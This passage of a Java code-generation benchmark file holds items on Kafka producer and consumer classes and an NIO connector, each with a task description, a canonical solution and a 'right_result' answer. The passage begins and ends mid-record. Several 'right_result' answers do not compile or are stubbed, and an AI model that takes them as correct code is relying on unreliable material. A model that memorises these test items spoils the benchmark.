consumer.poll(pollingInterval);\n                    consumer.commitAsync();\n                }\n                consumer.close();\n            }\n        };\n        consumerThread.start();\n    }\n\n    @PreDestroy\n    public void stopConsuming() {\n        running = false;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 32,
    "right_result": "```java\nimport org.apache.kafka.clients.consumer.Consumer;\nimport org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.apache.kafka.common.serialization.StringDeserializer;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport javax.annotation.PreDestroy;\nimport java.time.Duration;\nimport java.util.Collections;\nimport java.util.Properties;\n\n@Component\npublic class KafkaConsumeOrderWorkaround {\n    @Value(\"${kafka.bootstrap-servers}\")\n    private String bootstrapServers;\n\n    @Value(\"${kafka.topic-name}\")\n    private String topicName;\n\n    @Value(\"${kafka.consumer-group:order}\")\n    private String consumerGroup;\n\n    private Consumer<Long, String> consumer;\n    private long pollingInterval = 250L;\n    private boolean running = true;\n    private Thread consumerThread;\n\n    @PostConstruct\n    public void startConsuming() {\n        Properties props = new Properties();\n        props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n        props.put(ConsumerConfig.GROUP_ID_CONFIG, consumerGroup);\n        props.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());\n        props.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());\n\n        consumer = new KafkaConsumer<>(props);\n        consumer.subscribe(Collections.singletonList(topicName));\n\n        consumerThread = new Thread(() -> {\n            while (running) {\n                consumer.poll(Duration.ofMillis(pollingInterval)).forEach(record -> processMessage(record.value()));\n            }\n            consumer.close();\n        });\n        consumerThread.start();\n    }\n\n    @PreDestroy\n    public void stopConsuming() {\n        running = false;\n        try {\n            consumerThread.join();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    private void processMessage(String message) {\n        // Process the message asynchronously\n    }\n}\n```"
  },
  {
    "Task_id": 255,
    "Instruction": "Task Description: Create a Kafka producer wrapper class in Java that simplifies sending JSON data to Kafka topics.\n\nClass Description: The KafkaProducerWrapper class provides a convenient interface for producing messages to Kafka topics. It handles producer creation, message serialization, and error handling internally.\n\nAttributes:\n- kafkaProducer: Producer<Long, String> - The underlying Kafka producer instance\n- kafkaBrokers: String - Comma-separated list of Kafka broker addresses\n- gson: Gson - JSON serializer/deserializer instance\n\nMethods:\n- createKafkaProducer() -> Producer<Long, String> - Creates and configures a new Kafka producer instance with the specified broker addresses and serializers\n- send2Kafka(JsonElement jsonElement, String topicName) -> void - Serializes the JSON element and sends it to the specified Kafka topic\n- close() -> void - Properly closes the Kafka producer to release resources",
    "Canonical_solution": "import org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.common.serialization.LongSerializer;\nimport org.apache.kafka.common.serialization.StringSerializer;\nimport java.util.Properties;\nimport java.util.concurrent.ExecutionException;\nimport com.google.gson.JsonElement;\nimport com.google.gson.Gson;\n\npublic class KafkaProducerWrapper {\n\n    private Producer<Long, String> kafkaProducer;\n    private String kafkaBrokers;\n    private Gson gson = new Gson();\n\n    public KafkaProducerWrapper(String kafkaBrokers) {\n        this.kafkaBrokers = kafkaBrokers;\n        this.kafkaProducer = createKafkaProducer();\n    }\n\n    public Producer<Long, String> createKafkaProducer() {\n        Properties props = new Properties();\n        props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaBrokers);\n        props.put(ProducerConfig.CLIENT_ID_CONFIG, Launcher.getInstanceId());\n        props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, LongSerializer.class.getName());\n        props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());\n        props.put(ProducerConfig.MAX_BLOCK_MS_CONFIG, 10000);\n        return new KafkaProducer<>(props);\n    }\n\n    public void send2Kafka(JsonElement jsonElement, String topicName) {\n        ProducerRecord<Long, String> record = new ProducerRecord<>(topicName,\n                gson.toJson(jsonElement));\n        try {\n            kafkaProducer.send(record).get();\n        } \n        catch (ExecutionException e) {\n            logger.error(ExceptionUtils.getStackTrace(e));\n        } catch (InterruptedException e) {\n            logger.error(ExceptionUtils.getStackTrace(e));\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public void close() {\n        if (kafkaProducer != null) {\n            kafkaProducer.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "right_result": "```java\nimport com.google.gson.Gson;\nimport com.google.gson.JsonElement;\n\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.common.serialization.LongSerializer;\nimport org.apache.kafka.common.serialization.StringSerializer;\n\nimport java.util.Properties;\n\npublic class KafkaProducerWrapper {\n    private Producer<Long, String> kafkaProducer;\n    private String kafkaBrokers;\n    private Gson gson = new Gson();\n\n    public KafkaProducerWrapper(String kafkaBrokers) {\n        this.kafkaBrokers = kafkaBrokers;\n    }\n\n    public Producer<Long, String> createKafkaProducer() {\n        Properties props = new Properties();\n        props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaBrokers);\n        props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, LongSerializer.class.getName());\n        props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());\n        return new KafkaProducer<>(props);\n    }\n\n    public void send2Kafka(JsonElement jsonElement, String topicName) {\n        if (kafkaProducer == null) {\n            kafkaProducer = createKafkaProducer();\n        }\n        String jsonString = gson.toJson(jsonElement);\n        ProducerRecord<Long, String> record = new ProducerRecord<>(topicName, System.currentTimeMillis(), jsonString);\n        kafkaProducer.send(record);\n    }\n\n    public void close() {\n        if (kafkaProducer != null) {\n            kafkaProducer.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 256,
    "Instruction": "Task Description: Implement a Kafka Producer class for handling Dead Letter Queue (DLQ) messages in a rule-based processing system. The class should be able to configure a Kafka producer, convert various message types to bytes, populate message headers with rule context information, and send messages to a DLQ topic.\n\nClass Description: The `DlqAction` class is responsible for sending failed messages to a Dead Letter Queue (DLQ) topic in Kafka. It handles message serialization, header population, and asynchronous message sending with error handling. The class implements a `RuleAction` interface and provides configuration options for the DLQ topic and producer behavior.\n\nAttributes:\n\n- `log`: Logger - Logger instance for logging messages\n- `TYPE`: String - Constant identifying this action type as \"DLQ\"\n- `DLQ_TOPIC`: String - Configuration key for DLQ topic name\n- `DLQ_AUTO_FLUSH`: String - Configuration key for auto-flush setting\n- `PRODUCER`: String - Configuration key for producer instance\n- `HEADER_PREFIX`: String - Prefix for rule-related headers\n- `RULE_NAME`: String - Header key for rule name\n- `RULE_MODE`: String - Header key for rule mode\n- `RULE_SUBJECT`: String - Header key for rule subject\n- `RULE_TOPIC`: String - Header key for original topic\n- `RULE_EXCEPTION`: String - Header key for exception message\n- `configs`: Map<String, ?> - Configuration properties for the producer\n- `topic`: String - DLQ topic name\n- `autoFlush`: boolean - Flag for automatic flushing after send\n- `producer`: KafkaProducer<byte[], byte[]> - Kafka producer instance\n\nMethods:\n\n- `configure(Map<String, ?> configs)`: void - Configures the DLQ action with producer settings and topic name\n- `run(RuleContext ctx, Object message, RuleException ex)`: void - Processes and sends the message to DLQ topic\n- `producer()`: KafkaProducer<byte[], byte[]> - Returns or creates a Kafka producer instance\n- `convertToBytes(RuleContext ctx, Object message)`: byte[] - Converts various message types to byte arrays\n- `convertToJsonBytes(RuleContext ctx, Object message)`: byte[] - Converts objects to JSON byte arrays\n- `populateHeaders(RuleContext ctx, ProducerRecord<byte[], byte[]> producerRecord, RuleException ex)`: void - Adds rule context information to message headers\n- `toBytes(String value)`: byte[] - Helper method to convert strings to UTF-8 bytes\n- `baseProducerConfigs()`: Map<String, Object> - Creates base configuration for Kafka producer\n- `close()`: void - Closes the Kafka producer when no longer needed",
    "Canonical_solution": "import com.fasterxml.jackson.databind.JsonNode;\nimport io.confluent.kafka.schemaregistry.utils.JacksonMapper;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.charset.StandardCharsets;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.UUID;\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.common.errors.SerializationException;\nimport org.apache.kafka.common.header.Headers;\nimport org.apache.kafka.common.serialization.DoubleSerializer;\nimport org.apache.kafka.common.serialization.FloatSerializer;\nimport org.apache.kafka.common.serialization.IntegerSerializer;\nimport org.apache.kafka.common.serialization.LongSerializer;\nimport org.apache.kafka.common.serialization.ShortSerializer;\nimport org.apache.kafka.common.utils.Bytes;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class DlqAction implements RuleAction {\n\n  private static final Logger log = LoggerFactory.getLogger(DlqAction.class);\n\n  public static final String TYPE = \"DLQ\";\n  public static final String DLQ_TOPIC = \"dlq.topic\";\n  public static final String DLQ_AUTO_FLUSH = \"dlq.auto.flush\";\n  public static final String PRODUCER = \"producer\";\n  public static final String HEADER_PREFIX = \"__rule.\";\n  public static final String RULE_NAME = HEADER_PREFIX + \"name\";\n  public static final String RULE_MODE = HEADER_PREFIX + \"mode\";\n  public static final String RULE_SUBJECT = HEADER_PREFIX + \"subject\";\n  public static final String RULE_TOPIC = HEADER_PREFIX + \"topic\";\n  public static final String RULE_EXCEPTION = HEADER_PREFIX + \"exception\";\n\n  private static final LongSerializer LONG_SERIALIZER = new LongSerializer();\n  private static final IntegerSerializer INT_SERIALIZER = new IntegerSerializer();\n  private static final ShortSerializer SHORT_SERIALIZER = new ShortSerializer();\n  private static final DoubleSerializer DOUBLE_SERIALIZER = new DoubleSerializer();\n  private static final FloatSerializer FLOAT_SERIALIZER = new FloatSerializer();\n\n  private Map<String, ?> configs;\n  private String topic;\n  private boolean autoFlush;\n  private volatile KafkaProducer<byte[], byte[]> producer;\n\n  @Override\n  public void configure(Map<String, ?> configs) {\n    this.configs = configs;\n    this.topic = (String) configs.get(DLQ_TOPIC);\n    Object autoFlushConfig = configs.get(DLQ_AUTO_FLUSH);\n    if (autoFlushConfig != null) {\n      this.autoFlush = Boolean.parseBoolean(autoFlushConfig.toString());\n    }\n    this.producer = (KafkaProducer<byte[], byte[]>) configs.get(PRODUCER);\n  }\n\n  public void run(RuleContext ctx, Object message, RuleException ex) throws RuleException {\n    String topic = topic();\n    if (topic == null || topic.isEmpty()) {\n      topic = ctx.getParameter(DLQ_TOPIC);\n    }\n    if (topic == null || topic.isEmpty()) {\n      throw new SerializationException(\"Could not send to DLQ as no topic is configured\");\n    }\n    final String dlqTopic = topic;\n    try {\n      byte[] keyBytes = convertToBytes(ctx, ctx.originalKey());\n      byte[] valueBytes = convertToBytes(ctx, ctx.originalValue());\n      ProducerRecord<byte[], byte[]> producerRecord =\n          new ProducerRecord<>(dlqTopic, null, keyBytes, valueBytes, ctx.headers());\n      populateHeaders(ctx, producerRecord, ex);\n      producer().send(producerRecord, (metadata, exception) -> {\n        if (exception != null) {\n          log.error(\"Could not produce message to DLQ topic {}\", dlqTopic, exception);\n        } else {\n          log.info(\"Sent message to DLQ topic {}\", dlqTopic);\n        }\n      });\n      if (autoFlush) {\n        producer.flush();\n      }\n    } catch (Exception e) {\n      log.error(\"Could not produce message to DLQ topic {}\", dlqTopic, e);\n    }\n    throw ex != null ? new SerializationException(\"Rule failed: \" + ctx.rule().getName(), ex)\n        : new SerializationException(\"Rule failed: \" + ctx.rule().getName());\n  }\n\n  private KafkaProducer<byte[], byte[]> producer() {\n    if (producer == null) {\n      Map<String, Object> producerConfigs = baseProducerConfigs();\n      producerConfigs.putAll(configs);\n      synchronized (this) {\n        if (producer == null) {\n          producer = new KafkaProducer<>(producerConfigs);\n        }\n      }\n    }\n    return producer;\n  }\n\n  private byte[] convertToBytes(RuleContext ctx, Object message) throws IOException {\n    if (message == null) {\n      return null;\n    } else if (message instanceof byte[]) {\n      return (byte[]) message;\n    } else if (message instanceof ByteBuffer) {\n      ByteBuffer buffer = (ByteBuffer) message;\n      byte[] bytes = new byte[buffer.remaining()];\n      buffer.get(bytes);\n      return bytes;\n    } else if (message instanceof Bytes) {\n      return ((Bytes) message).get();\n    } else if (message instanceof String || message instanceof UUID) {\n      return message.toString().getBytes(StandardCharsets.UTF_8);\n    } else if (message instanceof Long) {\n      return LONG_SERIALIZER.serialize(ctx.topic(), (Long)message);\n    } else if (message instanceof Integer) {\n      return INT_SERIALIZER.serialize(ctx.topic(), (Integer) message);\n    } else if (message instanceof Short) {\n      return SHORT_SERIALIZER.serialize(ctx.topic(), (Short) message);\n    } else if (message instanceof Double) {\n      return DOUBLE_SERIALIZER.serialize(ctx.topic(), (Double) message);\n    } else if (message instanceof Float) {\n      return FLOAT_SERIALIZER.serialize(ctx.topic(), (Float) message);\n    } else {\n      return convertToJsonBytes(ctx, message);\n    }\n  }\n\n  private byte[] convertToJsonBytes(RuleContext ctx, Object message) throws IOException {\n    JsonNode json = ctx.target().toJson(message);\n    return JacksonMapper.INSTANCE.writeValueAsBytes(json);\n  }\n\n  private void populateHeaders(\n      RuleContext ctx, ProducerRecord<byte[], byte[]> producerRecord, RuleException ex) {\n    Headers headers = producerRecord.headers();\n    headers.add(RULE_NAME, toBytes(ctx.rule().getName()));\n    headers.add(RULE_MODE, toBytes(ctx.ruleMode().name()));\n    headers.add(RULE_SUBJECT, toBytes(ctx.subject()));\n    headers.add(RULE_TOPIC, toBytes(ctx.topic()));\n    if (ex != null) {\n      headers.add(RULE_EXCEPTION, toBytes(ex.getMessage()));\n    }\n  }\n\n  private byte[] toBytes(String value) {\n    if (value != null) {\n      return value.getBytes(StandardCharsets.UTF_8);\n    } else {\n      return null;\n    }\n  }\n\n  static Map<String, Object> baseProducerConfigs() {\n    Map<String, Object> producerProps = new HashMap<>();\n    producerProps.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG,\n        \"org.apache.kafka.common.serialization.ByteArraySerializer\");\n    producerProps.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG,\n        \"org.apache.kafka.common.serialization.ByteArraySerializer\");\n    producerProps.put(ProducerConfig.MAX_BLOCK_MS_CONFIG, Long.toString(Long.MAX_VALUE));\n    producerProps.put(ProducerConfig.ENABLE_IDEMPOTENCE_CONFIG, \"false\");\n    producerProps.put(ProducerConfig.ACKS_CONFIG, \"all\");\n    producerProps.put(ProducerConfig.MAX_IN_FLIGHT_REQUESTS_PER_CONNECTION, \"1\");\n    producerProps.put(ProducerConfig.DELIVERY_TIMEOUT_MS_CONFIG,\n        Integer.toString(Integer.MAX_VALUE));\n    return producerProps;\n  }\n\n  @Override\n  public void close() {\n    if (producer != null) {\n      producer.close();\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "right_result": "```java\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.common.serialization.ByteArraySerializer;\n\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.logging.Logger;\n\npublic class DlqAction implements RuleAction {\n    private static final Logger log = Logger.getLogger(DlqAction.class.getName());\n    public static final String TYPE = \"DLQ\";\n    public static final String DLQ_TOPIC = \"dlq.topic\";\n    public static final String DLQ_AUTO_FLUSH = \"dlq.auto.flush\";\n    public static final String PRODUCER = \"dlq.producer\";\n    public static final String HEADER_PREFIX = \"rule.\";\n    public static final String RULE_NAME = HEADER_PREFIX + \"name\";\n    public static final String RULE_MODE = HEADER_PREFIX + \"mode\";\n    public static final String RULE_SUBJECT = HEADER_PREFIX + \"subject\";\n    public static final String RULE_TOPIC = HEADER_PREFIX + \"originalTopic\";\n    public static final String RULE_EXCEPTION = HEADER_PREFIX + \"exception\";\n\n    private Map<String, ?> configs;\n    private String topic;\n    private boolean autoFlush;\n    private KafkaProducer<byte[], byte[]> producer;\n\n    @Override\n    public void configure(Map<String, ?> configs) {\n        this.configs = configs;\n        this.topic = (String) configs.get(DLQ_TOPIC);\n        this.autoFlush = Boolean.parseBoolean((String) configs.getOrDefault(DLQ_AUTO_FLUSH, \"false\"));\n        this.producer = (KafkaProducer<byte[], byte[]>) configs.get(PRODUCER);\n        if (this.producer == null) {\n            this.producer = new KafkaProducer<>(baseProducerConfigs());\n        }\n    }\n\n    @Override\n    public void run(RuleContext ctx, Object message, RuleException ex) {\n        try {\n            byte[] bytes = convertToBytes(ctx, message);\n            ProducerRecord<byte[], byte[]> record = new ProducerRecord<>(topic, bytes);\n            populateHeaders(ctx, record, ex);\n            producer.send(record);\n            if (autoFlush) {\n                producer.flush();\n            }\n        } catch (Exception e) {\n            log.severe(\"Error sending message to DLQ: \" + e.getMessage());\n        }\n    }\n\n    public KafkaProducer<byte[], byte[]> producer() {\n        return producer;\n    }\n\n    protected byte[] convertToBytes(RuleContext ctx, Object message) {\n        if (message instanceof String) {\n            return toBytes((String) message);\n        } else {\n            return convertToJsonBytes(ctx, message);\n        }\n    }\n\n    protected byte[] convertToJsonBytes(RuleContext ctx, Object message) {\n        // Implementation for converting object to JSON byte array\n        return new byte[0];\n    }\n\n    protected void populateHeaders(RuleContext ctx, ProducerRecord<byte[], byte[]> producerRecord, RuleException ex) {\n        producerRecord.headers().add(RULE_NAME, toBytes(ctx.getRuleName()));\n        producerRecord.headers().add(RULE_MODE, toBytes(ctx.getRuleMode()));\n        producerRecord.headers().add(RULE_SUBJECT, toBytes(ctx.getRuleSubject()));\n        producerRecord.headers().add(RULE_TOPIC, toBytes(ctx.getOriginalTopic()));\n        if (ex != null) {\n            producerRecord.headers().add(RULE_EXCEPTION, toBytes(ex.getMessage()));\n        }\n    }\n\n    protected byte[] toBytes(String value) {\n        return value.getBytes(java.nio.charset.StandardCharsets.UTF_8);\n    }\n\n    protected Map<String, Object> baseProducerConfigs() {\n        Map<String, Object> props = new HashMap<>();\n        props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, \"localhost:9092\");\n        props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class.getName());\n        props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class.getName());\n        return props;\n    }\n\n    @Override\n    public void close() {\n        if (producer != null) {\n            producer.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 258,
    "Instruction": "Task Description: Create a Java class that implements a Kafka producer for sending partition metric samples to a Kafka topic, with configurable producer properties and error handling.\n\nClass Description: KafkaSampleProducer is a class that provides functionality to create and manage a Kafka producer for sending partition metric samples. It handles producer configuration, message sending, and proper resource cleanup.\n\nAttributes:\n- PRODUCER_CLOSE_TIMEOUT: [Duration] - The maximum time to wait for the producer to close gracefully\n- _shutdown: [boolean] - Flag indicating whether the producer should be shut down\n- _producer: [Producer<byte[], byte[]>] - The Kafka producer instance\n\nMethods:\n- createProducer: [void]([Map<String, ?> config, String producerClientId]) -> [void] - Configures and creates a Kafka producer instance with the given configuration and client ID\n- storePartitionMetricSamples: [AtomicInteger]([MetricSampler.Samples samples, Producer<byte[], byte[]> producer, String partitionMetricSampleStoreTopic, Logger log]) -> [AtomicInteger] - Sends partition metric samples to the specified Kafka topic and returns the count of successfully sent samples\n- close: [void]([]) -> [void] - Gracefully shuts down the Kafka producer with a timeout",
    "Canonical_solution": "import com.linkedin.kafka.cruisecontrol.monitor.sampling.holder.PartitionMetricSample;\nimport java.time.Duration;\nimport java.util.Map;\nimport java.util.Properties;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.common.serialization.ByteArraySerializer;\nimport org.slf4j.Logger;\n\nimport static com.linkedin.kafka.cruisecontrol.monitor.sampling.SamplingUtils.bootstrapServers;\n\npublic class KafkaSampleProducer {\n    protected static final Duration PRODUCER_CLOSE_TIMEOUT = Duration.ofMinutes(3);\n    protected volatile boolean _shutdown = false;\n    protected Producer<byte[], byte[]> _producer;\n\n    protected void createProducer(Map<String, ?> config, String producerClientId) {\n        Properties producerProps = new Properties();\n        producerProps.putAll(config);\n        producerProps.setProperty(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers(config));\n        producerProps.setProperty(ProducerConfig.CLIENT_ID_CONFIG, producerClientId);\n        producerProps.setProperty(ProducerConfig.LINGER_MS_CONFIG, \"30000\");\n        producerProps.setProperty(ProducerConfig.BATCH_SIZE_CONFIG, \"500000\");\n        producerProps.setProperty(ProducerConfig.BUFFER_MEMORY_CONFIG, \"67108864\");\n        producerProps.setProperty(ProducerConfig.RETRIES_CONFIG, \"5\");\n        producerProps.setProperty(ProducerConfig.COMPRESSION_TYPE_CONFIG, \"gzip\");\n        producerProps.setProperty(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class.getName());\n        producerProps.setProperty(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class.getName());\n        producerProps.setProperty(ProducerConfig.RECONNECT_BACKOFF_MS_CONFIG, config.get(\"reconnect.backoff.ms\").toString());\n        _producer = new KafkaProducer<>(producerProps);\n    }\n\n    static AtomicInteger storePartitionMetricSamples(MetricSampler.Samples samples, Producer<byte[], byte[]> producer,\n                                                   String partitionMetricSampleStoreTopic, Logger log) {\n        final AtomicInteger metricSampleCount = new AtomicInteger(0);\n        for (PartitionMetricSample sample : samples.partitionMetricSamples()) {\n            producer.send(new ProducerRecord<>(partitionMetricSampleStoreTopic, null, sample.sampleTime(), null, sample.toBytes()),\n                        (recordMetadata, e) -> {\n                            if (e == null) {\n                                metricSampleCount.incrementAndGet();\n                            } else {\n                                log.error(\"Failed to produce partition metric sample for {} of timestamp {} due to exception\",\n                                          sample.entity().tp(), sample.sampleTime(), e);\n                            }\n                        });\n        }\n        return metricSampleCount;\n    }\n\n    public void close() {\n        _shutdown = true;\n        _producer.close(PRODUCER_CLOSE_TIMEOUT);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "right_result": "```java\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport java.time.Duration;\nimport java.util.Map;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class KafkaSampleProducer {\n    public static final Duration PRODUCER_CLOSE_TIMEOUT = Duration.ofSeconds(10);\n    private boolean _shutdown = false;\n    private KafkaProducer<byte[], byte[]> _producer;\n\n    public void createProducer(Map<String, ?> config, String producerClientId) {\n        config.put(ProducerConfig.CLIENT_ID_CONFIG, producerClientId);\n        _producer = new KafkaProducer<>(config);\n    }\n\n    public AtomicInteger storePartitionMetricSamples(MetricSampler.Samples samples, Producer<byte[], byte[]> producer, String partitionMetricSampleStoreTopic, Logger log) {\n        AtomicInteger successCount = new AtomicInteger(0);\n        for (MetricSampler.Sample sample : samples.getSamples()) {\n            try {\n                ProducerRecord<byte[], byte[]> record = new ProducerRecord<>(partitionMetricSampleStoreTopic, sample.getKey().getBytes(), sample.getValue().getBytes());\n                producer.send(record, (metadata, exception) -> {\n                    if (exception != null) {\n                        log.error(\"Failed to send message\", exception);\n                    } else {\n                        successCount.incrementAndGet();\n                    }\n                });\n            } catch (Exception e) {\n                log.error(\"Error processing sample\", e);\n            }\n        }\n        return successCount;\n    }\n\n    public void close() {\n        _shutdown = true;\n        if (_producer != null) {\n            try {\n                _producer.close(PRODUCER_CLOSE_TIMEOUT.toMillis());\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 262,
    "Instruction": "Task Description: Implement a Java class that manages non-blocking HTTP connections using Java NIO (New I/O) capabilities. The class should handle connection establishment, connection queue management, and distribute connections across multiple processors for load balancing.\n\nClass Description: NIOConnector is a thread-based class that manages asynchronous HTTP connections using Java NIO. It maintains a queue of pending connections, establishes them asynchronously, and distributes successfully established connections to a pool of NIOProcessor instances for further processing.\n\nAttributes:\n- name: String - The name identifier for this connector thread\n- selector: Selector - The NIO selector used for monitoring connection events\n- connectQueue: BlockingQueue<BackendConnection> - Queue holding pending connection requests\n- processors: NIOProcessor[] - Array of processors for handling established connections\n- nextProcessor: int - Index for round-robin processor selection\n- connectCount: long - Counter for tracking connection attempts\n\nMethods:\n- NIOConnector(String name) -> void - Constructor that initializes the connector with a name and opens a new selector\n- setProcessors(NIOProcessor[] processors) -> void - Sets the array of processors for connection distribution\n- postConnect(BackendConnection c) -> void - Adds a new connection request to the queue and wakes up the selector\n- run() -> void - Main thread loop that handles connection establishment and event processing\n- connect(Selector selector) -> void - Processes pending connections from the queue\n- finishConnect(SelectionKey key, Object att) -> void - Completes the connection process for a channel\n- clearSelectionKey(SelectionKey key) -> void - Cleans up a selection key after processing\n- nextProcessor() -> NIOProcessor - Selects the next processor in round-robin fashion\n\nInner Class:\n- ConnectIdGenerator - Generates unique IDs for established connections with thread-safe incrementing",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.util.Set;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\n\nimport org.apache.log4j.Logger;\n\npublic final class NIOConnector extends Thread {\n    private static final Logger LOGGER = Logger.getLogger(NIOConnector.class);\n    private static final ConnectIdGenerator ID_GENERATOR = new ConnectIdGenerator();\n\n    private final String name;\n    private final Selector selector;\n    private final BlockingQueue<BackendConnection> connectQueue;\n    private NIOProcessor[] processors;\n    private int nextProcessor;\n    private long connectCount;\n\n    public NIOConnector(String name) throws IOException {\n        super.setName(name);\n        this.name = name;\n        this.selector = Selector.open();\n        this.connectQueue = new LinkedBlockingQueue<BackendConnection>();\n    }\n\n    public void setProcessors(NIOProcessor[] processors) {\n        this.processors = processors;\n    }\n\n    public void postConnect(BackendConnection c) {\n        connectQueue.offer(c);\n        selector.wakeup();\n    }\n\n    @Override\n    public void run() {\n        final Selector selector = this.selector;\n        for (;;) {\n            ++connectCount;\n            try {\n                selector.select(1000L);\n                connect(selector);\n                Set<SelectionKey> keys = selector.selectedKeys();\n                try {\n                    for (SelectionKey key : keys) {\n                        Object att = key.attachment();\n                        if (att != null && key.isValid() && key.isConnectable()) {\n                            finishConnect(key, att);\n                        } else {\n                            key.cancel();\n                        }\n                    }\n                } finally {\n                    keys.clear();\n                }\n            } catch (Throwable e) {\n                LOGGER.warn(name, e);\n            }\n        }\n    }\n\n    private void connect(Selector selector) {\n        BackendConnection c = null;\n        while ((c = connectQueue.poll()) != null) {\n            try {\n                c.connect(selector);\n            } catch (Throwable e) {\n                c.error(ErrorCode.ERR_CONNECT_SOCKET, e);\n            }\n        }\n    }\n\n    private void finishConnect(SelectionKey key, Object att) {\n        BackendConnection c = (BackendConnection) att;\n        try {\n            if (c.finishConnect()) {\n                clearSelectionKey(key);\n                c.setId(ID_GENERATOR.getId());\n                NIOProcessor processor = nextProcessor();\n                c.setProcessor(processor);\n                processor.postRegister(c);\n            }\n        } catch (Throwable e) {\n            clearSelectionKey(key);\n            c.error(ErrorCode.ERR_FINISH_CONNECT, e);\n        }\n    }\n\n    private void clearSelectionKey(SelectionKey key) {\n        if (key.isValid()) {\n            key.attach(null);\n            key.cancel();\n        }\n    }\n\n    private NIOProcessor nextProcessor() {\n        if (++nextProcessor == processors.length) {\n            nextProcessor = 0;\n        }\n        return processors[nextProcessor];\n    }\n\n    private static class ConnectIdGenerator {\n        private static final long MAX_VALUE = Long.MAX_VALUE;\n        private long connectId = 0L;\n        private final Object lock = new Object();\n\n        private long getId() {\n            synchronized (lock) {\n                if (connectId >= MAX_VALUE) {\n                    connectId = 0L;\n                }\n                return ++connectId;\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 20,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\n\npublic class NIOConnector implements Runnable {\n    private String name;\n    private Selector selector;\n    private BlockingQueue<BackendConnection> connectQueue;\n    private NIOProcessor[] processors;\n    private int nextProcessor = 0;\n    private long connectCount = 0;\n\n    public NIOConnector(String name) throws IOException {\n        this.name = name;\n        this.selector = Selector.open();\n        this.connectQueue = new LinkedBlockingQueue<>();\n    }\n\n    public void setProcessors(NIOProcessor[] processors) {\n        this.processors = processors;\n    }\n\n    public void postConnect(BackendConnection c) {\n        try {\n            connectQueue.put(c);\n            selector.wakeup();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    @Override\n    public void run() {\n        while (!Thread.currentThread().isInterrupted()) {\n            try {\n                selector.select();\n                Iterator<SelectionKey> selectedKeys = selector.selectedKeys().iterator();\n                while (selectedKeys.hasNext()) {\n                    SelectionKey key = selectedKeys.next();\n                    if 